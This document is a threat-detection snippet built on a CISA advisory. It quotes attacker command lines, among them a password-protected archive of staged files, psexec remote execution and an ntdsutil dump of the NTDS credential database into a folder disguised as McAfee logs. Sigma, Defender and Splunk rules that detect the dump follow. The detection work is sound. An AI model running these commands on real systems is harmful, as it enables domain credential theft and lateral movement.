###

```pwsh
7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z c:\windows\temp\*

“C:\pstools\psexec.exe" \\{REDACTED} -s cmd /c “cmd.exe /c “netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999""

C:\Windows\system32\pcwrun.exe

C:\Users\Administrator\Desktop\Win.exe

cmd.exe /C dir /S \\{REDACTED}\c$\Users\{REDACTED} >> c:\windows\temp\{REDACTED}.tmp

“cmd.exe" /c wmic process call create “cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\McAfee_Logs\"
```

Sigma:

```yaml
title: APT Credential Dumping as McAffee Logs
id: a0eb8bbd-7616-4933-ae23-cbf2a1f7d2a7
status: experimental
description: Detects the credential dumping, creating a McAffe_Log folder.
references:
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
author: sim
date:
tags:
    - attack.credential_access
    - attack.attack.defense_evasion
    - attack.t1003.003 #OS Credential Dumping: NTDS
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\cmd.exe'
        - OriginalFileName: 'cmd.exe'
    selection_flag:
        CommandLine|contains: '/c wmic process call create'
    selection_key:
        CommandLine|contains:
            - 'cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs'
            - '& ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\McAfee_Logs\'
    condition: all of selection_*
falsepositives:
    - not known
level: high
```

MDE
```sql
DeviceProcessEvents | where ((FolderPath endswith @'\cmd.exe' or InitiatingProcessVersionInfoOriginalFileName =~ @'cmd.exe' or ProcessVersionInfoOriginalFileName =~ @'cmd.exe') and ProcessCommandLine contains @'/c wmic process call create' and (ProcessCommandLine contains @'cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs' or ProcessCommandLine contains @'& ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\McAfee_Logs\'))
```

Splunk
```sql
index=* source="WinEventLog:*" AND ((Image="*\\cmd.exe" OR OriginalFileName="cmd.exe") AND CommandLine="*/c wmic process call create*" AND (CommandLine="*cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs*" OR CommandLine="*& ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\*"))
```
